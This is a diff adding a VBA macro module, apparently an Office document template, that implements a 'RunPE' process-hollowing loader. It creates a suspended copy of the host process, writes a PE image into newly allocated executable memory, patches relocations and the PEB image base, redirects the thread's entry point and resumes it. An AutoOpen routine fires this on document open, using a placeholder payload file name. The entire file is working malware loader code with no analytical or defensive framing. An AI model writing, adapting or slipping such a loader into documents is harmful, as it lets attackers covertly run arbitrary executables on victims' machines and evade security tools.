@@ -1,0 +1,680 @@
+Option Explicit
+
+#If Win64 Then
+    Private Declare PtrSafe Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByVal sSource As LongPtr, ByVal lLength As Long)
+    Private Declare PtrSafe Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As LongPtr, ByVal lpFilename As String, ByVal nSize As Long) As Long
+    Private Declare PtrSafe Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+    Private Declare PtrSafe Function GetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
+    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
+    Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare PtrSafe Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
+    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
+    Private Declare PtrSafe Function SetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
+    Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
+    Private Declare PtrSafe Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal uExitCode As Integer) As Long
+#Else
+    Private Declare Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As Long, ByVal sSource As Long, ByVal lLength As Long)
+    Private Declare Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFilename As String, ByVal nSize As Long) As Long
+    Private Declare Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+    Private Declare Function GetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
+    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
+    Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
+    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
+    Private Declare Function SetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
+    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As Long) As Long
+    Private Declare Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As Long, ByVal uExitCode As Integer) As Long
+#End If
+
+Private Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
+Private Const IMAGE_SIZEOF_SHORT_NAME = 8
+Private Const MAXIMUM_SUPPORTED_EXTENSION = 512
+Private Const SIZE_OF_80387_REGISTERS = 80
+
+#If Win64 Then
+    Private Type M128A
+        Low As LongLong
+        High As LongLong
+    End Type
+#End If
+
+Private Type IMAGE_DOS_HEADER
+     e_magic As Integer
+     e_cblp As Integer
+     e_cp As Integer
+     e_crlc As Integer
+     e_cparhdr As Integer
+     e_minalloc As Integer
+     e_maxalloc As Integer
+     e_ss As Integer
+     e_sp As Integer
+     e_csum As Integer
+     e_ip As Integer
+     e_cs As Integer
+     e_lfarlc As Integer
+     e_ovno As Integer
+     e_res(4 - 1) As Integer
+     e_oemid As Integer
+     e_oeminfo As Integer
+     e_res2(10 - 1) As Integer
+     e_lfanew As Long
+End Type
+
+Private Type IMAGE_DATA_DIRECTORY
+    VirtualAddress As Long
+    Size As Long
+End Type
+
+Private Type IMAGE_BASE_RELOCATION
+    VirtualAddress As Long
+    SizeOfBlock As Long
+End Type
+
+Private Type IMAGE_FILE_HEADER
+    Machine As Integer
+    NumberOfSections As Integer
+    TimeDateStamp As Long
+    PointerToSymbolTable As Long
+    NumberOfSymbols As Long
+    SizeOfOptionalHeader As Integer
+    Characteristics As Integer
+End Type
+
+Private Type IMAGE_OPTIONAL_HEADER
+    #If Win64 Then
+        Magic As Integer
+        MajorLinkerVersion As Byte
+        MinorLinkerVersion As Byte
+        SizeOfCode As Long
+        SizeOfInitializedData As Long
+        SizeOfUninitializedData As Long
+        AddressOfEntryPoint As Long
+        BaseOfCode As Long
+        ImageBase As LongLong
+        SectionAlignment As Long
+        FileAlignment As Long
+        MajorOperatingSystemVersion As Integer
+        MinorOperatingSystemVersion As Integer
+        MajorImageVersion As Integer
+        MinorImageVersion As Integer
+        MajorSubsystemVersion As Integer
+        MinorSubsystemVersion As Integer
+        Win32VersionValue As Long
+        SizeOfImage As Long
+        SizeOfHeaders As Long
+        CheckSum As Long
+        Subsystem As Integer
+        DllCharacteristics As Integer
+        SizeOfStackReserve As LongLong
+        SizeOfStackCommit As LongLong
+        SizeOfHeapReserve As LongLong
+        SizeOfHeapCommit As LongLong
+        LoaderFlags As Long
+        NumberOfRvaAndSizes As Long
+        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
+    #Else
+        Magic As Integer
+        MajorLinkerVersion As Byte
+        MinorLinkerVersion As Byte
+        SizeOfCode As Long
+        SizeOfInitializedData As Long
+        SizeOfUninitializedData As Long
+        AddressOfEntryPoint As Long
+        BaseOfCode As Long
+        BaseOfData As Long
+        ImageBase As Long
+        SectionAlignment As Long
+        FileAlignment As Long
+        MajorOperatingSystemVersion As Integer
+        MinorOperatingSystemVersion As Integer
+        MajorImageVersion As Integer
+        MinorImageVersion As Integer
+        MajorSubsystemVersion As Integer
+        MinorSubsystemVersion As Integer
+        Win32VersionValue As Long
+        SizeOfImage As Long
+        SizeOfHeaders As Long
+        CheckSum As Long
+        Subsystem As Integer
+        DllCharacteristics As Integer
+        SizeOfStackReserve As Long
+        SizeOfStackCommit As Long
+        SizeOfHeapReserve As Long
+        SizeOfHeapCommit As Long
+        LoaderFlags As Long
+        NumberOfRvaAndSizes As Long
+        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
+    #End If
+End Type
+
+Private Type IMAGE_NT_HEADERS
+    Signature As Long
+    FileHeader As IMAGE_FILE_HEADER
+    OptionalHeader As IMAGE_OPTIONAL_HEADER
+End Type
+
+Private Type IMAGE_SECTION_HEADER
+    SecName(IMAGE_SIZEOF_SHORT_NAME - 1) As Byte
+    Misc As Long
+    VirtualAddress As Long
+    SizeOfRawData As Long
+    PointerToRawData As Long
+    PointerToRelocations As Long
+    PointerToLinenumbers As Long
+    NumberOfRelocations As Integer
+    NumberOfLinenumbers As Integer
+    Characteristics As Long
+End Type
+
+Private Type PROCESS_INFORMATION
+    hProcess As LongPtr
+    hThread As LongPtr
+    dwProcessId As Long
+    dwThreadId As Long
+End Type
+
+Private Type STARTUPINFO
+    cb As Long
+    lpReserved As String
+    lpDesktop As String
+    lpTitle As String
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As LongPtr
+    hStdInput As LongPtr
+    hStdOutput As LongPtr
+    hStdError As LongPtr
+End Type
+
+Private Type FLOATING_SAVE_AREA
+    ControlWord As Long
+    StatusWord As Long
+    TagWord As Long
+    ErrorOffset As Long
+    ErrorSelector As Long
+    DataOffset As Long
+    DataSelector As Long
+    RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte
+    Spare0 As Long
+End Type
+
+#If Win64 Then
+    Private Type XMM_SAVE_AREA32
+        ControlWord As Integer
+        StatusWord As Integer
+        TagWord As Byte
+        Reserved1 As Byte
+        ErrorOpcode As Integer
+        ErrorOffset As Long
+        ErrorSelector As Integer
+        Reserved2 As Integer
+        DataOffset As Long
+        DataSelector As Integer
+        Reserved3 As Integer
+        MxCsr As Long
+        MxCsr_Mask As Long
+        FloatRegisters(8 - 1) As M128A
+        XmmRegisters(16 - 1) As M128A
+        Reserved4(96 - 1) As Byte
+End Type
+#End If
+
+Private Type CONTEXT
+    #If Win64 Then
+
+        P1Home As LongLong
+        P2Home As LongLong
+        P3Home As LongLong
+        P4Home As LongLong
+        P5Home As LongLong
+        P6Home As LongLong
+
+        ContextFlags As Long
+        MxCsr As Long
+
+        SegCs As Integer
+        SegDs As Integer
+        SegEs As Integer
+        SegFs As Integer
+        SegGs As Integer
+        SegSs As Integer
+        EFlags As Long
+
+        Dr0 As LongLong
+        Dr1 As LongLong
+        Dr2 As LongLong
+        Dr3 As LongLong
+        Dr6 As LongLong
+        Dr7 As LongLong
+
+        Rax As LongLong
+        Rcx As LongLong
+        Rdx As LongLong
+        Rbx As LongLong
+        Rsp As LongLong
+        Rbp As LongLong
+        Rsi As LongLong
+        Rdi As LongLong
+        R8 As LongLong
+        R9 As LongLong
+        R10 As LongLong
+        R11 As LongLong
+        R12 As LongLong
+        R13 As LongLong
+        R14 As LongLong
+        R15 As LongLong
+
+        Rip As LongLong
+
+        FltSave As XMM_SAVE_AREA32
+
+        VectorRegister(26 - 1) As M128A
+        VectorControl As LongLong
+
+        DebugControl As LongLong
+        LastBranchToRip As LongLong
+        LastBranchFromRip As LongLong
+        LastExceptionToRip As LongLong
+        LastExceptionFromRip As LongLong
+    #Else
+        ContextFlags As Long
+        Dr0 As Long
+        Dr1 As Long
+        Dr2 As Long
+        Dr3 As Long
+        Dr6 As Long
+        Dr7 As Long
+        FloatSave As FLOATING_SAVE_AREA
+        SegGs As Long
+        SegFs As Long
+        SegEs As Long
+        SegDs As Long
+        Edi As Long
+        Esi As Long
+        Ebx As Long
+        Edx As Long
+        Ecx As Long
+        Eax As Long
+        Ebp As Long
+        Eip As Long
+        SegCs As Long
+        EFlags As Long
+        Esp As Long
+        SegSs As Long
+        ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As Byte
+    #End If
+End Type
+
+Private Const MEM_COMMIT = &H1000
+Private Const MEM_RESERVE = &H2000
+Private Const PAGE_READWRITE = &H4
+Private Const PAGE_EXECUTE_READWRITE = &H40
+Private Const MAX_PATH = 260
+Private Const CREATE_SUSPENDED = &H4
+
+Private Const CONTEXT_AMD64 = &H100000
+Private Const CONTEXT_I386 = &H10000
+#If Win64 Then
+    Private Const CONTEXT_ARCH = CONTEXT_AMD64
+#Else
+    Private Const CONTEXT_ARCH = CONTEXT_I386
+#End If
+Private Const CONTEXT_CONTROL = CONTEXT_ARCH Or &H1
+Private Const CONTEXT_INTEGER = CONTEXT_ARCH Or &H2
+Private Const CONTEXT_SEGMENTS = CONTEXT_ARCH Or &H4
+Private Const CONTEXT_FLOATING_POINT = CONTEXT_ARCH Or &H8
+Private Const CONTEXT_DEBUG_REGISTERS = CONTEXT_ARCH Or &H10
+Private Const CONTEXT_EXTENDED_REGISTERS = CONTEXT_ARCH Or &H20
+Private Const CONTEXT_FULL = CONTEXT_CONTROL Or CONTEXT_INTEGER Or CONTEXT_SEGMENTS
+Private Const VERBOSE = False
+Private Const IMAGE_DOS_SIGNATURE = &H5A4D
+Private Const IMAGE_NT_SIGNATURE = &H4550
+Private Const IMAGE_FILE_MACHINE_I386 = &H14C
+Private Const IMAGE_FILE_MACHINE_AMD64 = &H8664
+Private Const SIZEOF_IMAGE_DOS_HEADER = 64
+Private Const SIZEOF_IMAGE_SECTION_HEADER = 40
+Private Const SIZEOF_IMAGE_FILE_HEADER = 20
+Private Const SIZEOF_IMAGE_DATA_DIRECTORY = 8
+Private Const SIZEOF_IMAGE_BASE_RELOCATION = 8
+Private Const SIZEOF_IMAGE_BASE_RELOCATION_ENTRY = 2
+#If Win64 Then
+    Private Const SIZEOF_IMAGE_NT_HEADERS = 264
+    Private Const SIZEOF_ADDRESS = 8
+#Else
+    Private Const SIZEOF_IMAGE_NT_HEADERS = 248
+    Private Const SIZEOF_ADDRESS = 4
+#End If
+Private Const IMAGE_DIRECTORY_ENTRY_EXPORT = 0
+Private Const IMAGE_DIRECTORY_ENTRY_IMPORT = 1
+Private Const IMAGE_DIRECTORY_ENTRY_RESOURCE = 2
+Private Const IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3
+Private Const IMAGE_DIRECTORY_ENTRY_SECURITY = 4
+Private Const IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
+Private Const IMAGE_DIRECTORY_ENTRY_DEBUG = 6
+Private Const IMAGE_DIRECTORY_ENTRY_COPYRIGHT = 7
+Private Const IMAGE_DIRECTORY_ENTRY_GLOBALPTR = 8
+Private Const IMAGE_DIRECTORY_ENTRY_TLS = 9
+Private Const IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10
+
+Public Function ByteArrayLength(baBytes() As Byte) As Long
+    On Error Resume Next
+    ByteArrayLength = UBound(baBytes) - LBound(baBytes) + 1
+End Function
+
+Private Function ByteArrayToString(baBytes() As Byte) As String
+    Dim strRes As String: strRes = ""
+    Dim iCount As Integer
+    For iCount = 0 To ByteArrayLength(baBytes) - 1
+        If baBytes(iCount) <> 0 Then
+            strRes = strRes & Chr(baBytes(iCount))
+        Else
+            Exit For
+        End If
+    Next iCount
+    ByteArrayToString = strRes
+End Function
+
+Private Function FileToByteArray(strFilename As String) As Byte()
+
+    Dim strFileContent As String
+    Dim iFile As Integer: iFile = FreeFile
+    Open strFilename For Binary Access Read As #iFile
+        strFileContent = Space(FileLen(strFilename))
+        Get #iFile, , strFileContent
+    Close #iFile
+
+    Dim baFileContent() As Byte
+    baFileContent = StrConv(strFileContent, vbFromUnicode)
+
+    FileToByteArray = baFileContent
+End Function
+
+Private Function StringToByteArray(strContent As String) As Byte()
+    Dim baContent() As Byte
+    baContent = StrConv(strContent, vbFromUnicode)
+    StringToByteArray = baContent
+End Function
+
+Private Function A(strA As String, bChar As Byte) As String
+    A = strA & Chr(bChar)
+End Function
+
+Private Function B(strA As String, strB As String) As String
+    B = strA + strB
+End Function
+
+Private Function PE() As String
+    Dim strPE As String
+    strPE = ""
+    PE = strPE
+End Function
+
+Public Sub RunPE(ByRef baImage() As Byte, strArguments As String)
+
+    Dim structDOSHeader As IMAGE_DOS_HEADER
+    Dim ptrDOSHeader As LongPtr: ptrDOSHeader = VarPtr(structDOSHeader)
+    Call RtlMoveMemory(ptrDOSHeader, VarPtr(baImage(0)), SIZEOF_IMAGE_DOS_HEADER)
+
+    If structDOSHeader.e_magic = IMAGE_DOS_SIGNATURE Then
+    Else
+        Exit Sub
+    End If
+
+    Dim structNTHeaders As IMAGE_NT_HEADERS
+    Dim ptrNTHeaders As LongPtr: ptrNTHeaders = VarPtr(structNTHeaders)
+    Call RtlMoveMemory(ptrNTHeaders, VarPtr(baImage(structDOSHeader.e_lfanew)), SIZEOF_IMAGE_NT_HEADERS)
+
+    If structNTHeaders.Signature = IMAGE_NT_SIGNATURE Then
+    Else
+        Exit Sub
+    End If
+
+    If VERBOSE Then
+    End If
+    #If Win64 Then
+        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_I386 Then
+            Exit Sub
+        End If
+    #Else
+        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64 Then
+            Exit Sub
+        End If
+    #End If
+
+    Dim strCurrentFilePath As String
+    strCurrentFilePath = Space(MAX_PATH)
+    Dim lGetModuleFileName As Long
+    lGetModuleFileName = GetModuleFileName(0, strCurrentFilePath, MAX_PATH)
+    strCurrentFilePath = Left(strCurrentFilePath, InStr(strCurrentFilePath, vbNullChar) - 1)
+
+    Dim strCmdLine As String
+    strCmdLine = strCurrentFilePath + " " + strArguments
+
+    Dim strNull As String
+    Dim structProcessInformation As PROCESS_INFORMATION
+    Dim structStartupInfo As STARTUPINFO
+
+    Dim lCreateProcess As Long
+    lCreateProcess = CreateProcess(strNull, strCurrentFilePath + " " + strArguments, 0&, 0&, False, CREATE_SUSPENDED, 0&, strNull, structStartupInfo, structProcessInformation)
+    If lCreateProcess = 0 Then
+        Exit Sub
+    End If
+
+    Dim structContext As CONTEXT
+    structContext.ContextFlags = CONTEXT_INTEGER
+    Dim lGetThreadContext As Long
+    #If Win64 Then
+        Dim baContext(0 To (LenB(structContext) - 1)) As Byte
+        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
+        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
+    #Else
+        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, structContext)
+    #End If
+
+    If lGetThreadContext = 0 Then
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    Else
+        #If Win64 Then
+            Call RtlMoveMemory(VarPtr(structContext), VarPtr(baContext(0)), LenB(structContext))
+        #End If
+    End If
+
+    Dim structRelocDirectory As IMAGE_DATA_DIRECTORY
+    Call RtlMoveMemory(VarPtr(structRelocDirectory), VarPtr(structNTHeaders.OptionalHeader.DataDirectory(IMAGE_DIRECTORY_ENTRY_BASERELOC)), SIZEOF_IMAGE_DATA_DIRECTORY)
+
+    Dim ptrDesiredImageBase As LongPtr: ptrDesiredImageBase = 0
+    If structRelocDirectory.VirtualAddress = 0 Then
+        ptrDesiredImageBase = structNTHeaders.OptionalHeader.ImageBase
+    End If
+
+    Dim ptrProcessImageBase As LongPtr
+    ptrProcessImageBase = VirtualAllocEx(structProcessInformation.hProcess, ptrDesiredImageBase, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    If ptrProcessImageBase = 0 Then
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    End If
+
+    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
+        Dim lImageBaseAddrOffset As Long
+        Dim ptrImageBase As LongPtr
+        #If Win64 Then
+            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
+        #Else
+            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
+        #End If
+
+        Call RtlMoveMemory(VarPtr(baImage(0 + lImageBaseAddrOffset)), VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS)
+
+    End If
+
+    Dim ptrImageLocalCopy As LongPtr
+    ptrImageLocalCopy = VirtualAlloc(0&, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    If ptrImageLocalCopy = 0 Then
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    End If
+
+    Call RtlMoveMemory(ptrImageLocalCopy, VarPtr(baImage(0)), structNTHeaders.OptionalHeader.SizeOfHeaders)
+
+    If VERBOSE Then
+    End If
+    Dim iCount As Integer
+    Dim structSectionHeader As IMAGE_SECTION_HEADER
+    For iCount = 0 To (structNTHeaders.FileHeader.NumberOfSections - 1)
+
+        Call RtlMoveMemory(VarPtr(structSectionHeader), VarPtr(baImage(structDOSHeader.e_lfanew + SIZEOF_IMAGE_NT_HEADERS + (iCount * SIZEOF_IMAGE_SECTION_HEADER))), SIZEOF_IMAGE_SECTION_HEADER)
+
+        Dim strSectionName As String: strSectionName = ByteArrayToString(structSectionHeader.SecName)
+        Dim ptrNewAddress As LongPtr: ptrNewAddress = ptrImageLocalCopy + structSectionHeader.VirtualAddress
+        Dim lSize As Long: lSize = structSectionHeader.SizeOfRawData
+
+
+        Call RtlMoveMemory(ptrNewAddress, VarPtr(baImage(0 + structSectionHeader.PointerToRawData)), lSize)
+    Next iCount
+
+    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
+
+        Dim lMaxSize As Long: lMaxSize = structRelocDirectory.Size
+        Dim lRelocAddr As Long: lRelocAddr = structRelocDirectory.VirtualAddress
+
+        Dim structReloc As IMAGE_BASE_RELOCATION
+        Dim lParsedSize As Long: lParsedSize = 0
+
+        Do While lParsedSize < lMaxSize
+
+            Dim ptrStructReloc As LongPtr: ptrStructReloc = ptrImageLocalCopy + lRelocAddr + lParsedSize
+            Call RtlMoveMemory(VarPtr(structReloc), ptrStructReloc, SIZEOF_IMAGE_BASE_RELOCATION)
+            lParsedSize = lParsedSize + structReloc.SizeOfBlock
+
+            If (structReloc.VirtualAddress <> 0) And (structReloc.SizeOfBlock <> 0) Then
+
+                Dim lEntriesNum As Long: lEntriesNum = (structReloc.SizeOfBlock - SIZEOF_IMAGE_BASE_RELOCATION) / SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
+                Dim lPage As Long: lPage = structReloc.VirtualAddress
+
+                Dim ptrBlock As LongPtr: ptrBlock = ptrStructReloc + SIZEOF_IMAGE_BASE_RELOCATION
+                Dim iBlock As Integer
+                Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
+
+                iCount = 0
+                For iCount = 0 To (lEntriesNum - 1)
+                    Dim iBlockType As Integer: iBlockType = ((iBlock And &HF000) / &H1000) And &HF
+                    Dim iBlockOffset As Integer: iBlockOffset = iBlock And &HFFF
+
+                    If iBlockType = 0 Then
+                        Exit For
+                    End If
+
+                    Dim iPtrSize As Integer: iPtrSize = 0
+                    If iBlockType = &H3 Then
+                        iPtrSize = 4
+                    ElseIf iBlockType = &HA Then
+                        iPtrSize = 8
+                    End If
+
+                    Dim ptrRelocateAddr As LongPtr
+                    ptrRelocateAddr = ptrImageLocalCopy + lPage + iBlockOffset
+
+                    If iPtrSize <> 0 Then
+                        Dim ptrRelocate As LongPtr
+                        Call RtlMoveMemory(VarPtr(ptrRelocate), ptrRelocateAddr, iPtrSize)
+                        ptrRelocate = ptrRelocate - structNTHeaders.OptionalHeader.ImageBase + ptrProcessImageBase
+                        Call RtlMoveMemory(ptrRelocateAddr, VarPtr(ptrRelocate), iPtrSize)
+                    End If
+
+                    ptrBlock = ptrBlock + SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
+                    Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
+
+                Next iCount
+            End If
+        Loop
+    End If
+
+    Dim lWriteProcessMemory As Long
+    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrProcessImageBase, ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, 0&)
+    If lWriteProcessMemory = 0 Then
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    End If
+
+    Call VirtualFree(ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, &H10000) ' &H10000 = MEM_FREE
+
+    Dim ptrPEBImageBaseAddr As LongPtr
+    #If Win64 Then
+        ptrPEBImageBaseAddr = structContext.Rdx + 16
+    #Else
+        ptrPEBImageBaseAddr = structContext.Ebx + 8
+    #End If
+
+    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrPEBImageBaseAddr, VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS, 0&)
+    If lWriteProcessMemory = 0 Then
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    End If
+
+    Dim ptrEntryPoint As LongPtr: ptrEntryPoint = ptrProcessImageBase + structNTHeaders.OptionalHeader.AddressOfEntryPoint
+    #If Win64 Then
+        structContext.Rcx = ptrEntryPoint
+    #Else
+        structContext.Eax = ptrEntryPoint
+    #End If
+
+    Dim lSetThreadContext As Long
+    #If Win64 Then
+        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
+        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
+    #Else
+        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, structContext)
+    #End If
+    If lSetThreadContext = 0 Then
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    End If
+
+    Dim lResumeThread As Long
+    lResumeThread = ResumeThread(structProcessInformation.hThread)
+    If lResumeThread = 1 Then
+    Else
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    End If
+
+End Sub
+
+Public Sub AutoOpen()
+
+    Dim strSrcFile As String
+    Dim baSrcFileContent() As Byte
+    Dim strSrcArguments As String
+    Dim strSrcPE As String
+
+    strSrcFile = "aPAYLOAD1a"
+
+    strSrcArguments = ""
+
+    strSrcPE = PE()
+    If strSrcPE = "" Then
+        If Dir(strSrcFile) = "" Then
+            Exit Sub
+        Else
+            If VERBOSE Then
+            End If
+        End If
+        baSrcFileContent = FileToByteArray(strSrcFile)
+        Call RunPE(baSrcFileContent, strSrcArguments)
+    Else
+        baSrcFileContent = StringToByteArray(strSrcPE)
+        Call RunPE(baSrcFileContent, strSrcArguments)
+    End If
+
+End Sub
